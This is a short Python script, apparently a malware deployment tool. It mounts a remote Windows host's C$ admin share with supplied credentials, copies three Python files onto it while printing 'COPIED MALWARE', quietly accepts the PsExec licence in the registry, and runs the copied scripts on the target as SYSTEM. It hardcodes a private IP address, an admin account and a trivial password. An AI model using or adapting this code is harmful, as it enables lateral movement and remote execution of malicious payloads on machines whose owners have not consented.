import os
import subprocess


def main(ip, user, password):
    os.popen('Net use * /delete /Y').read()
    print('STARTING')
    os.popen(r'Net use h: \\' + ip + r'\c$ /user:"' + user + r'" "' + password + '" /p:yes').read()
    print("CONNECTED")
    print(str(os.popen(r'copy ".\initiator.py" "h:\"  /Y').read()))
    print(str(os.popen(r'copy "..\FileTransfer.py" "h:\"  /Y').read()))
    print(str(os.popen(r'copy ".\CreateEnv.py" "h:\"  /Y').read()))
    print("COPIED MALWARE")
    print(str(os.popen('reg.exe ADD HKCU\Software\Sysinternals\PSexec /v EulaAccepted /t REG_DWORD /d 1 /f').read()))
    os.popen('Net use * /delete /Y').read()
    proc = subprocess.Popen(['Psexec', '\\\\' + ip, '-u', user, '-p', password, '-i', '-s', 'python', 'c:\\CreateEnv.py'], stdout=subprocess.PIPE)
    x = proc.communicate()[0]
    print(str(x))
    x = proc.returncode
    print(str(x))
    if (x == None or x == 0):
        proc = subprocess.Popen(['Psexec', '\\\\' + ip, '-u', user, '-p', password, '-i', '-s', 'python', 'c:\\initiator.py'], stdout=subprocess.PIPE)
        x = proc.communicate()[0]
        print(str(x))
        x = proc.returncode
        print(str(x))
        if (x == None or x == 0):
            return True
    return False


if __name__ == '__main__':
    main('192.168.68.122', 'LAPTOP-6IK2H466\\admin', '123456')
